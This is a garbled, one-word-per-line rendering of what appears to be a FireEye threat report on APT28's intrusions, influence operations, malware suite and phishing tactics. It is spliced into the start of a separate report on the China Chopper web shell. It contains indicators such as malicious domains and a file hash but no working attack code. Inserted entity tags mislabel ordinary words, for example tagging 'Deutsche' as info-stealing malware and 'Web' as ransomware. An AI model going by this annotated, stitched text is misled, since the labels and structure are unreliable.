TI
N
G
O
F
P
O
LITIC
AL
ENTITI
E
S
AN
D
I
NTRUSIO
N
AC
TIVIT
Y

E
NTIT
Y

OSCE

TIM
E
FR
AM
E

AP
T2
8
TARG
ETING
AN
D
INTRUSION
AC
TIVIT
Y

NOVEMBER
2016

The
OSCE
confirmed
that
it
had
suffered
an
intrusion
,
which
a
Western
intelligence
service
attributed
to
APT28.1 B_malware.infosteal

Germany's
Christian

Democratic
Union
(
CDU
)

APRIL
-
MAY
2016

Researchers
at
Trend
Micro
observed
APT28 B_malware.infosteal
establish
a
fake

CDU
email
server
and
launch
phishing
emails
against
CDU
members
in
an
attempt
to
obtain
their
email
credentials
and
access
their
accounts.2,3

Pussy
Riot

AUGUST
2015

APT28
targets
Russian
rockers
and
dissidents
Pussy
Riot
via
spear-phishing
emails.4

NATO
,
Afghan
Ministry
of
Foreign
Affairs
,
Pakistani

Military

JULY
2015

APT28 B_malware.infosteal
used
two
domains
(
nato-news.com B_url.distribute
and
bbc-news.org  B_url.distribute
)
to
host
an
Adobe
Flash
zero-day
exploit
to
target
NATO
,
the
Afghan
Ministry
of
Foreign
Affairs
,
and
the
Pakistani
military
.

German
Bundestag
&
Political
Parties

JUNE
2015

Germany's
Federal
Office
for
Security
in
Information
Technology
(
BSI
)
announced
that
APT28 B_malware.infosteal
was
likely
responsible
for
the
spear
phishing
emails
sent
to
members
of
several
German
political
parties
.
The
head
of
Germany's
domestic
intelligence
agency
,
Bundesamt
für
Verfassungsschutz
(
BfV
)
,
also
attributed
the
June
2015
compromise
of
the
Bundestag's
networks
to
APT28.5,6 B_malware.infosteal

Kyrgyzstan
Ministry
of
Foreign
Affairs

OCTOBER
2014

THROUGH

SEPTEMBER
2015

FireEye
iSight
Intelligence
identified
changes
made
to
domain
name
server
(
DNS
)
records
that
suggest
that
APT28 B_malware.infosteal
intercepted
email
traffic
from
the
Kyrgyzstan
Ministry
of
Foreign
Affairs
after
maliciously
modifying
DNS
records
of
the
ministry's
authoritative
DNS
servers
.

Polish
Government
&
Power

Exchange
websites

JUNE
AND

SEPTEMBER
2014

APT28 B_malware.infosteal
employed
'
Sedkit  B_malware.unknown
'
in
conjunction
with
strategic
web
compromises
to
deliver
'
Sofacy  B_malware.unknown
'
malware
on
Polish
Government
websites
,
and
the
websites
of
Polish
energy
company
Power
Exchange.7
1
.
Gauquelin
,
Blaise
.
'
La
Russie
soupçonnée
d'être
responsable
d'un
piratage
informatique
contre
l'OSCE
.
'
Le
Monde
.
28
Dec
.
2016
.
Web
.
29
Dec
.
2016
.

2
.
Trend
Micro
refers
to
activity
corresponding
to
FireEye's
APT28 B_malware.infosteal
as
'
Pawn
Storm
.
'

3
.
Hacquebord
Feike
.
'
Pawn
Storm
Targets
German
Christian
Democratic
Union
.
'
Trend
Micro
.
11
May
2016
.
Web
.
29
Dec
.
2016
.

4
.
Hacquebord
Feike
.
'
Pawn
Storm's
Domestic
Spying
Campaign
Revealed;
Ukraine
and
US
Top
Global
Targets
.
'
TrendLabs
Security
Intelligence
Blog
,
Trend
Micro
.
18
August
2015
.
Web
.
29
Dec
.
2016
.

6
.
'
Russia
'
was
Behind
German
Parliament
Hack
.
'
'
The
BBC
.
13
May
2016
.
Web
.
29
Dec
.
2016
.

7
,
Kharouni
,
Loucif
.
et
al
.
'
Operation
Pawn
Storm
:
Using
Decoys
to
Evade
Detection
.
'
Trend
Micro
.
22
Oct
.
2014
.
Web
.
3
Jan
.
2017
.
'
Neuer
Hackerangriff
auf
Bundespolitiker
/
BSI
warnt
Parteien
vor
Cyberangriffen
.
'
Westdeutscher
Rundfunk
.
20
Sept
.
2016
.
Web
.
29
Dec
.
2016
.

Since
2014
,
APT28 B_malware.infosteal
network
activity
has
likely
supported
information
operations
designed
to
influence
the
domestic
politics
of
foreign
nations
.

Some
of
these
operations
have
involved
the
disruption
and
defacement
of
websites
,
false
flag
operations
using
false
hacktivist
personas
,
and
the
theft
of
data
that
was
later
leaked
publicly
online
.

Table
2
highlights
incidents
in
which
victims
suffered
a
compromise
that
FireEye
iSIGHT
Intelligence
,
other
authorities
,
or
the
victims
themselves
later
attributed
to
the
group
we
track
as
APT28 B_malware.infosteal
.

All
of
these
operations
have
aimed
to
achieve
a
similar
objective
:
securing
a
political
outcome
beneficial
to
Russia
.

TABLE
2
:
APT28 B_malware.infosteal
N
E
T
WO
R
K
AC
TIVIT
Y
HAS
LI
K
ELY
SU
PP
O
RTED
I
N
FO
R
MATIO
N
O
PER
ATIO
N
S

VIC
TIM

TIM
E
FR
AM
E

AP
T2
8
N
ET
WOR
K
AC
TIVIT
Y

World
Anti-Doping

Agency
(
WADA
)

SEPTEMBER
2016

On
September
13
,
WADA
confirmed
that
APT28 B_malware.infosteal
had
compromised
its
networks
and
accessed
athlete
medical
data.8

ASSOCIATE
D
IN
FOR
MATION
OPE
R
ATIONS

AC
TIVIT
Y

On
September
12
,
2016
,
the
'
Fancy
Bears
'
Hack
Team
'
persona
claimed
to
have
compromised
WADA
and
released
athletes
'
medical
records
as
'
proof
of
American
athletes
taking
doping.'9

U.S.
Democratic
National

Committee
(
DNC
)

APRIL
–

SEPTEMBER
2016

John
Podesta

MARCH
–

NOVEMBER
2016

U.S.
Democratic

Congressional
Campaign

Committee
(
DCCC
)

MARCH
-

OCTOBER
2016

The
DNC
announced
it
had
suffered
a
network
compromise
and
that
a
subsequent
investigation
found
evidence
of
two
breaches
,
attributed
to

APT28 B_malware.infosteal
and
APT29 B_malware.infosteal
.

FireEye
analyzed
the
malware
found
on
DNC
networks
and
determined
that
it
was
consistent
with
our
previous
observations
of
APT28 B_malware.infosteal
tools.10,11

In
June
2016
,
shortly
after
the
DNC's
announcement
,
the
Guccifer
2.0
persona
claimed
responsibility
for
the
DNC
breach
and
leaked
documents
taken
from
the
organization's
network
.

Guccifer
2.0
continued
to
leak
batches
of
DNC
documents
through
September.12,13

Investigators
found
that
John
Podesta
,
Hillary

Clinton's
presidential
campaign
chairman
,
was
one
of
thousands
of
individuals
targeted
in
a
mass
phishing
scheme
using
shortened
URLs
that
security
researchers
attributed
to
APT28.14  B_malware.infosteal

Throughout
October
and
into
early
November
,
WikiLeaks
published
34
batches
of
email
correspondence
stolen
from
John

Podesta's
personal
email
account
.

Correspondence
of
other
individuals
targeted
in
the
same
phishing
campaign
,
including
former
Secretary
of
State
Colin
Powell
and
Clinton
campaign
staffer
William
Rinehart
,
were
published
on
the
'
DC
Leaks
'
website.15

In
July
,
the
DCCC
announced
that
it
was
investigating
an
ongoing
'
cybersecurity
incident
'
that
the
FBI
believed
was
linked
to
the
compromise
of
the
DNC
.

House
Speaker
Nancy
Pelosi
later
confirmed
that
the
DCCC
had
suffered
a
network
compromise
.

Investigators
indicated
that
the
actors
may
have
gained
access
to
DCCC
systems
as
early
as
March.16,17,18

In
August
,
the
Guccifer
2.0
persona
contacted
reporters
covering
U.S.
House
of
Representative
races
to
announce
newly
leaked
documents
from
the
DCCC
pertaining
to
Democratic
candidates
.

From
August
to
October
,
Guccifer
2.0
posted
several
additional
installments
of
what
appear
to
be
internal
DCCC
documents
on
'
his
'
WordPress
site.19,20

TV5Monde

FEBRUARY
2015
,

APRIL
2015

In
February
,
FireEye
identified
CORESHELL
traffic
beaconing
from
TV5Monde's
network
,
confirming
that
APT28 B_malware.infosteal
had
compromised
TV5Monde's
network
.

In
April
2015
,
alleged
pro-ISIS
hacktivist
group
CyberCaliphate   B_malware.infosteal
defaced
TV5Monde's
websites
and
social
media
profiles
and
forced
the
company's
11
broadcast
channels
offline
.
FireEye
identified
overlaps
between
the
domain
registration
details
of

CyberCaliphate's  B_malware.infosteal
website
and
APT28 B_malware.infosteal
infrastructure.21

Ukrainian
Central

Election
Commission
(
CEC
)

MAY
2014

Ukrainian
officials
revealed
that
the
investigation
into
the
compromise
of
the
CEC's
internal
network
identified
malware
traced
to
APT28.22  B_malware.infosteal

During
the
May
2014
Ukrainian
presidential
election
,
purported
pro-Russian
hacktivists
CyberBerkut B_malware.infosteal
conducted
a
series
of
malicious
activities
against
the
CEC
including
a
system
compromise
,
data
destruction
,
a
data
leak
,
a
distributed
denial-of-service
(
DDoS
)
attack
,
and
an
attempted
defacement
of
the
CEC
website
with
fake
election
results.23

8
.
'
WADA
Confirms
Attack
by
Russian
Cyber
Espionage
Group
.
'
World
Anti-Doping
Agency
.
13
Sept
.
2016
.
Web
.
29
Dec
.
2016
.

9
.
Fancy
Bears
'
HT
(
fancybears
)
.
'
@AnonPress
Greetings
.
We
hacked
#WADA
.
We
have
Proof
of
American
Athletes
taking
doping
.
Fancybear.net
.
'
12
Sept
.
2016
,
4:12
PM
.
Tweet
.

10
.
CrowdStrike
refers
to
activity
corresponding
to
FireEye's
APT28 B_malware.infosteal
and
APT29
as
'
Fancy
Bear
'
and
'
Cozy
Bear
,
'
respectively
.

11
.
'
Nakashima
,
Ellen
.
'
Cyber
Researchers
Confirm
Russian
Government
Hack
of
Democratic
National
Committee
.
'
The
Washington
Post
.
20
June
2016
.
Web
.
29
Dec
.
2016
.

12
.
'
Rid
,
Thomas
.
'
All
Signs
Point
to
Russia
Being
Behind
the
DNC
Hack
.
'
Motherboard
,
Vice
.
25
July
2016
.
Web
.
29
Dec
.
2016
.

13
.
'
Bennett
,
Cory
.
'
Guccifer
2.0
Drops
More
DNC
Docs
.
'
Politico
.
13
Sept
.
2016
.
Web
.
2
Jan
.
2017
.
<>

14
.
Perlroth
,
Nicole
.
Shear
,
Michael
D
.
'
Private
Security
Group
Says
Russia
was
Behind
John
Podesta's
Email
Hack
.
'
The
New
York
Times
.
21
Oct
.
2016
.
Web
.
2
Jan
.
2017
.

15
.
'
Franceschi-Bicchierai
,
Lorenzo
.
'
How
Hackers
Broke
Into
John
Podesta
and
Colin
Powell's
Gmail
Accounts
.
'
20
Oct
.
2016
.
Web
.
2
Jan
.
2017
.

16
.
'
Nakashima
,
Ellen
.
'
FBI
Probes
Suspected
Breach
of
Another
Democratic
Organization
by
Russian
Hackers
.
'
The
Washington
Post
.
29
July
2016
.
Web
.
29
Dec
.
2016
.

17
.
'
Pelosi
,
Nancy
.
'
DCCC
Cyber
Breach
.
'
13
August
2016
.
Email
.
U.S.
House
of
Representatives
.
Washington
,
DC
.
Politico
.
Web
.
29
Dec
.
2016
.

18
.
'
Lipton
,
Eric
.
Shane
,
Scott
.
'
Democratic
House
Candidates
Were
Also
Targets
of
Russian
Hacking
.

'
The
New
York
Times
.
13
Dec
.
2016
.
Web
.
29
Dec
.
2016
.

19
.
Ibid
.

FROM
OLYMPIC
SLIGHT
TO
DATA
LEAK
:

Investigating
APT28 B_malware.infosteal
at
the
World
Anti-Doping
Agency

As
news
of
the
DNC
breach
spread
,
APT28 B_malware.infosteal
was
preparing
for
another
set
of
operations
:
countering
the
condemnation
that
Russia
was
facing
after
doping
allegations
and
a
threatened
blanket
ban
of
the
Russian
team
from
the
upcoming
Rio
Games
.

Russia
,
like
many
nations
,
has
long
viewed
success
in
the
Olympic
Games
as
a
source
of
national
prestige
and
soft
power
on
the
world
stage
.

The
doping
allegations
and
prospective
ban
from
the
Games
further
ostracized
Russia
,
and
likely
provided
motivation
to
actively
counter
the
allegations
by
attempting
to
discredit
anti-doping
agencies
and
policies
.

Our
investigation
of
APT28's B_malware.infosteal
compromise
of

WADA's
network
,
and
our
observations
of
the
surrounding
events
reveal
how
Russia
sought
to
counteract
a
damaging
narrative
and
delegitimize
the
institutions
leveling
criticism
.

ALLEGATIONS
OF
RUSSIAN
ATHLETES
'
WIDESPREAD
DOPING

NOV
(
2015
)

JULY
18

AUG
4

WADA
declares
the

Russian
Anti-Doping

Agency
(
RUSADA
)
noncompliant.24

WADA-commissioned
report
documents
evidence
of
Russian
athletes
'
widespread
doping.25

Russian
athletes
were
barred
from
competing
in
the
Olympic
Games.26

APT28 B_malware.infosteal
COMPROMISES
WADA

EARLY
AUG

AUG
10

AUG
25-SEP
12

APT28 B_malware.infosteal
sends
spear
phishing
emails
to

WADA
employees.27

APT28 B_malware.infosteal
uses
a
legitimate
user
account
belonging
to
a
Russian
athlete
to
log
into
WADA's
Anti-

Doping
Administration
and
Management

System
(
ADAMS
)
database.28

APT28 B_malware.infosteal
gains
access
to
an
International

Olympic
Committee
account
created
specifically
for
the
2016

Olympic
Games
,
and
views
and
downloads
athlete
data.29

FALSE
HACKTIVIST
PERSONAS
CLAIM
TO
TARGET
WADA
,
LEAK
ATHLETE
DATA

AUG
9

AUG
11

SEP
12

SEP
13

SEP
15-30

The
actor
@anpoland
,
purporting
to
represent
'
Anonymous
Poland
,
'
claims
to
have
defaced
the

WADA
website.30

On
August
11
@anpoland
threatens
to
conduct
a
DDoS
attack
against
and
leak
data
from
WADA
,
but
fails
to
follow
through
on
the
threats.31,32

WADA
releases
a
statement
confirming
the
breach
and
attributes
the
compromise
and
theft
of
athlete
medical
data
to
APT28.35  B_malware.infosteal
'
Fancy
Bears
'
Hack

Team
'
releases
five
additional
batches
of
medical
files
for
high-profile
athletes
from
multiple
nations
,
including
the
U.S.
,
which
had
applied
for
and
received

Therapeutic
Use

Exemptions
(
TUEs
)
for
medications
otherwise
banned
from
competition.36

Claiming
to
support
'
fair
play
and
clean
sport
,
'
Fancy
Bears
'

Hack
team
calls
TUEs
'
licenses
for
doping.'37
'
Fancy
Bears
'
Hack

Team
'
,
a
previously
unknown
group
purporting
to
be
affiliated
with

Anonymous
,
claims
via
Twitter
to
have
compromised
WADA
,
and
directs
readers
to
a
website
hosting
stolen
documents.33

In
tweets
to
international
journalists
and

Twitter
accounts
that
disseminate
hacktivist
and
information
security
news
,
'
Fancy
Bears
'

Hack
Team
'
claims
to
have
'
proof
of

American
athletes
taking
doping.'34

Based
on
this
timeline
of
leak
and
threatened
leak
activity
,
as
well
as
strikingly
similar
characteristics
and
distribution
methods
shared
between
@anpoland
and
'
Fancy
Bears
'
Hack
Team
,
'
the
same
operators
are
highly
likely
behind
the
two
personas
.
WADA
officials
,
citing
evidence
provided
by
law
enforcement
,
stated
that
the
threat
activity
originated
in
Russia
,
possibly
in
retaliation
for
WADA's
exposure
of
Russia's
expansive
,
state-run
doping.38
The
statement
prompted
denials
from
the

Russian
Government
,
with
Russian
sports
minister

Vitaly
Mutko
asking
,
'
How
can
you
prove
that
the
hackers
are
Russian
?
You
blame
Russia
for
everything
,
it
is
very
in
fashion
now.'39

20
.
Gallagher
,
Sean
.
'
Guccifer
2.0
Posts
DCCC
Docs
,
Says
They're
From
Clinton
Foundation
.
'
Ars
Technica
.
4
Oct
.
2016
.
Web
.
3
Jan
.
2017
.

21
.
'
Russian
Hackers
Suspected
in
French
TV
Cyberattack
.
'
Deutsche  B_malware.infosteal
Welle I
.
6
Oct
.
2015
.
Web
.
29
Dec
.
2016
.

22
.
Joselow
,
Gabe
.
'
Election
Cyberattacks
:
Pro-Russia
Hackers
Have
Been
Accused
in
Past
.
'
NBC
News
.
3
Nov
.
2016
.
Web
.
29
Dec
.
2016
.

23
.
Clayton
,
Mark
.
'
Ukraine
Election
Narrowly
Avoided
'
Wanton
Destruction
'
From
Hackers
(
+Video
)
.
'
The
Christian
Science
Monitor
.
17
June
2014
.
Web
.
2
Jan
.
2017
.

24
.
'
Foundation
Board
Media
Release
:
WADA
Strengthens
Anti-Doping
Worldwide
.
'
World
Anti-Doping
Agency
.
18
November
2015
.

25
.
'
Russia
State-Sponsored
Doping
Across
Majority
of
Olympic
Sports
,
Claims
Report
.
'
The
BBC
.
18
July
2016
.
Web
.
29
Dec
.
2016
.

26
.
Macguire
,
Eoghan
.
Almasy
,
Steve
.
'
271
Russian
Athletes
Cleared
for
Rio
Games
.
'
CNN
.
5
August
2016
.
Web
.
29
Dec
.
2016
.

27
.
'
Cyber
Security
Update
:
WADA's
Incident
Response
.
'
World
Anti-Doping
Agency
.
5
Oct
.
2016
.
Web
.
3
Jan
.
2017
.

28
.
'
WADA
Confirms
Attack
by
Russian
Cyber
Espionage
Group
.
'
World
Anti-Doping
Agency
.
13
Sept
.
2016
.

29
.
'
WADA
Confirms
Another
Batch
of
Athlete
Data
Leaked
by
Russian
Cyber
Hackers
'
Fancy
Bear
.
'
'
World
Anti-Doping
Agency
.
14
Sept
.
2016
.
Web
.
29
Dec
.
2016
.
<>

30
.
[OP
PL]
.
'
www.tas-cas.org B_url.normal
.
'
Online
video
clip
.
YouTube
.
YouTube
,
9
Aug
.
2016
.
Web
.
3
Jan
.
2017
.

31
.
Anonymous
Poland
(
@anpoland
)
.
'
@Cryptomeorg
@ben_rumsby
@PogoWasRight
@Jason_A_Murdock
@Cyber_War_News
@kevincollier
Tomorrow
will
ddos
WADA
and
publish
some
secret
dosc
.
'
11
Aug
2016
10:10

AM
.
Tweet
.

32
.
Anonymous
Poland
(
@anpoland
)
.
'
@JoeUchill
within
a
few
days
will
be
new
attack
on
the
WADA/Olimpic
.
'
5
Sept
.
2016
5:19
AM
.
Tweet
.

33
.
Fancy
Bears
'
HT
(
fancybears
)
.
'
@AnonPress
Greetings
.
We
hacked
#WADA
.
We
have
Proof
of
American
Athletes
taking
doping
.
Fancybear.net
.
'

34
.
Ibid
.

35
.
'
WADA
Confirms
Attack
by
Russian
Cyber
Espionage
Group.'World
Anti-Doping
Agency.13
Sept
.
2016
.

36
.
Russian
Hackers
Leak
Simone
Biles
and
Serena
Williams
Files
.
'
The
BBC
.
13
Sept
.
2016
.
Web
.
29
Dec
.
2016
.

37
.
Rumsby
,
Ben
.
'
US
Superstars
Serena
and
Venus
Williams
and
Simone
Biles
Given
Drugs
Exemption
,
Russian
Hackers
Reveal
.
'
The
Telegraph
.
14
Sept
.
2016
.
Web
.
29
Dec
.
2016
.

38
.
Luhn
,
Alec.'Fancy
Bears
Origins
Unclear
But
Russia
Seizes
Chance
to
Put
Boot
into
Wada
.
'
15
Sept
.
2016
.
Web
.
29
Dec
.
2016
.

39
.
Gibson
,
Owen
.
'
Russian
Sports
Minister
Vitaly
Mutko
Denies
Link
to
Wada
Hackers
.
'
The
Guardian
.
14
Sept
.
2016
.
Web
.
29
Dec
.
2016
.

CONCLUSION

Since
releasing
our
2014
report
,
we
continue
to
assess
that

APT28 B_malware.infosteal
is
sponsored
by
the
Russian
Government
.

We
further
assess
that
APT28 B_malware.infosteal
is
the
group
responsible
for
the
network
compromises
of
WADA
and
the
DNC
and
other
entities
related
to
the
2016
U.S.
presidential
election
cycle
.

These
breaches
involved
the
theft
of
internal
data
-
mostly
emails
–
that
was
later
strategically
leaked
through
multiple
forums
and
propagated
in
a
calculated
manner
almost
certainly
intended
to
advance
particular
Russian
Government
aims
.

In
a
report
released
on
January
7
2017
,
the
U.S.
Directorate
of

National
Intelligence
described
this
activity
as
an
'
influence
campaign
.
'

This
influence
campaign
-
a
combination
of
network
compromises
and
subsequent
data
leaks
-
aligns
closely
with
the
Russian
military's
publicly
stated
intentions
and
capabilities
.

Influence
operations
,
also
frequently
called
'
information
operations
,
'
have
a
long
history
of
inclusion
in
Russian
strategic
doctrine
,
and
have
been
intentionally
developed
,
deployed
,
and
modernized
with
the
advent
of
the
internet
.

The
recent
activity
in
the
U.S.
is
but
one
of
many
instances
of
Russian
Government
influence
operations
conducted
in
support
of
strategic
political
objectives
,
and
it
will
not
be
the
last
.

As
the
2017
elections
in
Europe
approach
-
most
notably
in
Germany
,
France
,
and
the
Netherlands
-
we
are
already
seeing
the
makings
of
similarly
concerted
efforts
.

APPENDIX
:

APT28's B_malware.infosteal
Tools
,
Tactics
,
and
Operational
Changes

In
our
2014
report
,
we
identified
APT28 B_malware.infosteal
as
a
suspected
Russian
government-sponsored
espionage
actor
.

We
came
to
this
conclusion
in
part
based
on
forensic
details
left
in
the
malware
that
APT28 B_malware.infosteal
had
employed
since
at
least
2007
.

We
have
provided
an
updated
version
of
those
conclusions
,
a
layout
of
the
tactics
that
they
generally
employ
,
as
well
as
observations
of
apparent
tactical
shifts
.

For
full
details
,
please
reference
our
2014
report
,
APT28 B_malware.infosteal
:
A
Window
into
Russia's
Cyber

Espionage
Operations
?

APT28 B_malware.infosteal
employs
a
suite
of
malware
with
features
indicative
of
the
group's
plans
for
continued
operations
,
as
well
as
the
group's
access
to
resources
and
skilled
developers
.

Key
characteristics
of
APT28's B_malware.infosteal
toolset
include
:
•
A
flexible
,
modular
framework
that
has
allowed
APT28 B_malware.infosteal
to
consistently
evolve
its
toolset
since
at
least
2007
.
•
Use
of
a
formal
coding
environment
in
which
to
develop
tools
,
allowing
the
group
to
create
and
deploy
custom
modules
within
its
backdoors
.

•
Incorporation
of
counter-analysis
capabilities
including
runtime
checks
to
identify
an
analysis
environment
,
obfuscated
strings
unpacked
at
runtime
,
and
the
inclusion
of
unused
machine
instructions
to
slow
analysis
.

•
Code
compiled
during
the
normal
working
day
in
the
Moscow
time
zone
and
within
a
Russian
language
build
environment
.

OVER

APT28'S B_malware.infosteal
MALWARE

SAMPLES
WERE

COMPILED
DURING

THE
WORKING
WEEK

SAMPLES
COMPILED

BETWEEN
8AM
AND
6PM

IN
THE
TIMEZONE
THAT

INCLUDES
MAJOR
RUSSIAN

CITIES
SUCH
AS
MOSCOW

AND
ST
.
PETERSBURG

IN
ADDITION
,

APT28'S B_malware.infosteal
DEVELOPERS

CONSISTENTLY
BUILT

MALWARE
IN
RUSSIAN

LANGUAGE
SETTINGS
UNTIL
2013

SPECIAL
REPORT
/
APT28 B_malware.infosteal
:
AT
THE
CENTER
OF
THE
STORM

APT28'S B_malware.infosteal
MALWARE
SUITE

TOOL

ROLE

AK
A

CHOPSTICK B_malware.backdoor
backdoor

Xagent
,
webhp
,
SPLM
,
(
.v2
fysbis
)

EVILTOSS  B_malware.backdoor
backdoor

Sedreco
,
AZZY
,
Xagent
,
ADVSTORESHELL
,
NETUI

GAMEFISH  B_malware.backdoor
backdoor

Sednit
,
Seduploader
,
JHUHUGIT
,
Sofacy

SOURFACE  B_malware.backdoor
downloader

Older
version
of
CORESHELL
,
Sofacy

OLDBAIT B_malware.backdoor
credential
harvester

Sasfis

CORESHELL B_malware.drop
downloader

Newer
version
of
SOURFACE
,
Sofacy

APT28'S B_malware.infosteal
OPERATIONAL
CHANGES
SINCE
2014

APT28 B_malware.infosteal
continues
to
evolve
its
toolkit
and
refine
its
tactics
in
what
is
almost
certainly
an
effort
to
protect
its
operational
effectiveness
in
the
face
of
heightened
public
exposure
and
scrutiny
.

In
addition
to
the
continued
evolution
of
the
group's
first
stage
tools
,
we
have
also
noted
APT28 B_malware.infosteal
:
•
Leveraging
zero-day
vulnerabilities
in
Adobe
Flash
Player
,

Java
,
and
Windows
,
including
CVE-2015-1701
,
CVE-2015-2424
,

CVE-2015-2590
,
CVE-2015-3043
,
CVE-2015-5119
,
and
CVE2015-7645
.

•
Using
a
profiling
script
to
deploy
zero-days
and
other
tools
more
selectively
,
decreasing
the
chance
that
researchers
and
others
will
gain
access
to
the
group's
tools
.

•
Increasing
reliance
on
public
code
depositories
,
such
as
Carberp
,
PowerShell
Empire
,
P.A.S.
webshell
,
Metasploit
modules
,
and
others
in
a
likely
effort
to
accelerate
their
development
cycle
and
provide
plausible
deniability
.

•
Obtaining
credentials
through
fabricated
Google

App
authorization
and
Oauth
access
requests
that
allow
the
group
to
bypass
two-factor
authentication
and
other
security
measures
.

•
Moving
laterally
through
a
network
relying
only
on
legitimate
tools
that
already
exist
within
the
victims
'
systems
,
at
times
forgoing
their
traditional
toolset
for
the
duration
of
the
compromise
.

These
changes
are
not
only
indicative
of
APT28's B_malware.infosteal
skills
,
resourcefulness
,
and
desire
to
maintain
operational
effectiveness
,
but
also
highlight
the
longevity
of
the
group's
mission
and
its
intent
to
continue
its
activities
for
the
foreseeable
future
.

SPECIAL
REPORT
/
APT28 B_malware.infosteal
:
AT
THE
CENTER
OF
THE
STORM

APT28 B_malware.infosteal
TACTICS

We
have
observed
APT28 B_malware.infosteal
rely
on
four
key
tactics
when
attempting
to
compromise
intended
targets
.

These
include
sending
spear-phishing
emails
that
either
deliver
exploit
documents
that
deploy
malware
onto
a
user's
systems
,
or
contain
a
malicious
URL
designed
to
harvest
the
recipients
'
email
credentials
and
provide
access
to
the
their
accounts
.

APT28 B_malware.infosteal
has
also
compromised
and
placed
malware
on
legitimate
websites
intending
to
infect
site
visitors
,
and
has
gained
access
to
organizations
by
compromising
their
web-facing
servers

TACTIC

TACTIC

INFECTION
WITH
MALWARE
VIA
SPEAR
PHISH

WEBMAIL
ACCESS
VIA
SPEAR-PHISH

Craft
exploit
document
with
enticing
lure
content
.

Register
a
domain
spoofing
that
of
a
legitimate
organization
(
e.g.
,
theguardiannews[.]org
)
.

Register
a
domain
spoofing
a
webmail
service
or
an
organization's
webmail
portal
(
e.g.
,
0nedrive-0ffice365[.]com  B_url.distribute
)

Send
exploit
document
to
victim
.

Send
link
mirroring
structure
of
legitimate
organization's
site
that
is
designed
to
expire
once
users
clickit
.

Victim
opens
document
,
and
malware
is
installed
by
exploiting
a
vulnerability
(
e.g.
,
ARM-NATO_

ENGLISH_30_NOV_2016
.

doc
leveraged
an
Adobe
Flash
exploit
,
CVE-2016-7855
,
to
install
GAMEFISH
targeted
machine
)
.

Victim
goes
to
link
and
retrieves
malicious
document
or
is
served
a
web-based
exploit
that
installs
malware
.

(
Flash
Vulnerability
CVE2016-7855
and
Windows

Vulnerability
CVE-2016-7255
were
exploited
as
zero
days
to
install
malware
on
victims
who
visited
a
malicious
URL
)
.

APT28 B_malware.infosteal
IS
IN
YOUR
NETWORK
.

Send
email
to
targets
instructing
them
to
reset
their
passwords
.

Send
email
to
victims
warning
of
security
risk
and
asking
them
to
enable
security
service
.

Recipient
visits
fake
login
page

Person
is
asked
to
authorize
and
enters
credentials
.
application
to
view
mail
and
gives
access
.

APT28 B_malware.infosteal
uses
stolen
credentials
to
access
mailbox
and
read
email
.

APT28 B_malware.infosteal
leverages
OAuth
privileges
given
to
malicious
application
to
read
email
.

SPECIAL
REPORT
/
APT28 B_malware.infosteal
:
AT
THE
CENTER
OF
THE
STORM

TACTIC

TACTIC

INFECTION
WITH
MALWARE
VIA
STRATEGIC

WEB
COMPROMISE
(
SWC
)

ACCESS
THROUGH
INTERNET-FACING
SERVERS

Compromise
a
legitimate
site
and
set
up
malicious
iFrame
.

Network
reconnaissance
to
find
vulnerable
software
.

Users
of
the
site
are
redirected
using
malicious
iFrame
and
profiled

Exploitation
of
previously
known
vulnerabilities
present
on
unpatched
systems
.

(
e.g
,
this
technique
was
used
to
compromise
and
infect
visitors
to
numerous

Polish
Government
websites
in
2014
)
.

Leverage
initial
compromise
to
access
other
systems
and
move
deeper
into
the
victim
network
.

Exploit
is
served
to
users
matching
the
target
profile
and
malware
is
installed
on
their
system
.

APT28 B_malware.infosteal
IS
IN
YOUR
NETWORK
.

APT28 B_malware.infosteal
IS
IN
YOUR
NETWORK
.

SPECIAL
REPORT
/
APT28 B_malware.infosteal
:
AT
THE
CENTER
OF
THE
STORM

To
download
this
or
other

FireEye
iSIGHT
Intelligence
reports
,
visit
:
www.fireeye.com/reports.html  B_url.normal

FireEye
,
Inc
.
1440
McCarthy
Blvd
.
Milpitas
,
CA
95035
408.321.6300
/
877.FIREEYE
(
347.3393
)
/
info@FireEye.com
www.FireEye.com B_url.normal
©
2016
FireEye
,
Inc
.
All
rights
reserved
.
FireEye
is
a
registered
trademark
of
FireEye
,
Inc
.

All
other
brands
,
products
,
or
service
names
are
or
may
be
trademarks
or
service
marks
of
their
respective
owners
.
GRAF-60
.
China B_malware.backdoor
Chopper's IThe
Little
Malware
That
Could
:

Detecting
and
Defeating
the
China B_malware.backdoor
Chopper's I
Web B_malware.ransom
Shell I

FireEye
Labs

Authors
:
Tony
Lee
,
Ian
Ahl
and
Dennis
Hanzlik

Contents

Introduction

Components

Capabilities

Payload
Attributes

Platform

Delivery
Mechanism

Traffic
Analysis

Detection

Conclusion

About
FireEye

Introduction

China B_malware.backdoor
Chopper's I
is
an
increasingly
popular
Web B_malware.ransom
Shell I
that
packs
a
powerful
punch
into
a
small
package
.

In
the
space
of
just
4
kilobytes
,
the
Web B_malware.ransom
shell I
offers
file
and
database
management
,
code
obfuscation
,
and
more—all
in
an
easy-to-use
graphical
user
interface
that
even
novices
can
use
.

Given
its
growing
prevalence
,
especially
among
Chinese
cybercriminals
,
China B_malware.backdoor
Chopper's I
warrants
much
more
exposure
than
it
has
received
to
date
.

Outside
of
an
insightful
blog
post
from
security
researcher
Keith
Tyler1
,
little
useful
information
on
China B_malware.backdoor
Chopper's I
is
publically
available
.

To
contribute
something
new
to
the
public
knowledge
base—especially
for
those
who
happen
to
find
the
China B_malware.backdoor
Chopper's I
server-side
payload
on
one
of
their
Web
servers—FireEye
studied
the
components
,
capabilities
,
payload
attributes
,
and
the
detection
rate
of
this
4
kilobyte
menace
.

This
report
describes
the
features
that
make
China B_malware.backdoor
Chopper's I
an
increasingly
popular
tool
for
cyber
attackers
.

And
more
important
,
the
report
explains
how
security
professionals
can
better
detect
the

Web B_malware.ransom
Shell I
through
network
traffic
and
on
compromised
systems
.

Components

China B_malware.backdoor
Chopper's I
is
a
simple
backdoor
in
terms
of
components
.
It
has
two
key
components
:
the
Web B_malware.ransom
Shell I
command-and-control
(
CnC
)
client
binary
and
a
text-based
Web B_malware.ransom
Shell I
payload
(
server
component
)
.

The
text-based
payload
is
so
simple
and
short
that
an
attacker
could
type
it
by
hand
right
on
the
target
server—no
file
transfer
needed
.

Web B_malware.ransom
Shell I
client

The
Web B_malware.ransom
Shell I
client
was
originally
available
on
www.maicaidao.com
.
FireEye
advises
against
visiting
that
site
now
.

Web B_malware.ransom
Shell I
(
CnC
)
Client

MD5
Hash
caidao.exe
5001ef50c7e869253a7c152a638eab8a  B_hash

Table
1
:
Original
Web B_malware.ransom
Shell I
